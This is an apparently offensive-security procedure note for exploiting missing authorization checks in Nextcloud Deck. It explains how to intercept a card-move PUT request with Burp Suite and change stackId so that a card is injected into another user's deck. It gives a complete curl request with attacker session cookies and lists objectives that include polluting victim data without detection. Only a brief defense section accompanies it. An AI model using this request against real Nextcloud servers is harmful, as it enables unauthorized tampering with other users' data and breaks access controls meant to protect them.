---
tags:
  - nextcloud
  - deck
  - stack-injection
  - burp
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/put-move-deck-card-target]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:29:19.811Z'
sub_techniques: []
id: bc27c6a2-2dd0-4e91-9937-a2caca10acfc
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Intercept-and-Modify-Stack-ID-for-Injection

## Summary

This procedure intercepts a card move request and modifies the stackId to inject the task into another user's deck, exploiting missing authorization checks.

## Description

Targeting the PUT /apps/deck/cards/{id} endpoint, alter stackId from own (e.g., 2) to victim's (e.g., 6). Use a proxy to tamper. This bypasses controls, adding the card to unauthorized deck. Requires prior card ID and victim stack ID (discoverable via other means or enumeration).

## Requirements

1. Proxy tool like Burp Suite configured
2. Victim's stack ID (e.g., from shared decks or API enumeration)
3. Authenticated session

## Defense

Defensive measures and detection strategies:

- Add server-side checks for stack ownership on PUT
- Monitor cross-user API modifications
- Use WAF to detect stackId tampering patterns

## Objectives

1. Bypass access control via parameter manipulation
2. Inject task into victim's deck
3. Pollute target data without detection

## Instructions

### Step 1: Set Up Interception

**Context**: Configure Burp Suite as proxy for browser or curl traffic.

### Step 2: Trigger and Modify Request

**Context**: Repeat the move from previous procedure, intercept, change stackId to 6, forward.

**Command** ([[commands/put-move-deck-card-target]]):
```bash
curl -X PUT 'https://nextcloud.example.com/apps/deck/cards/13' \
  -H 'Content-Type: application/json' \
  -H 'OCS-APIRequest: true' \
  -H 'Cookie: nc_username=attacker; nc_token=session_token' \
  -d '{"title":"SOME_TEST","description":"","stackId":6,"type":"plain","lastModified":1588755341,"lastEditor":null,"createdAt":1588755341,"labels":null,"assignedUsers":null,"attachments":null,"attachmentCount":null,"owner":"attacker","order":999,"archived":false,"duedate":null,"deletedAt":0,"commentsUnread":0,"id":13,"overdue":0}'
```

> Modifies stackId to victim's. Expected: 200 OK; card in victim's deck.

### Step 3: Verify Injection

**Context**: Log in as victim or query their deck.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Valid Accounts]] Valid Accounts

### Sub-Techniques


## Commands Used

- [[commands/put-move-deck-card-target]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- nextcloud
- deck
- injection
- interception
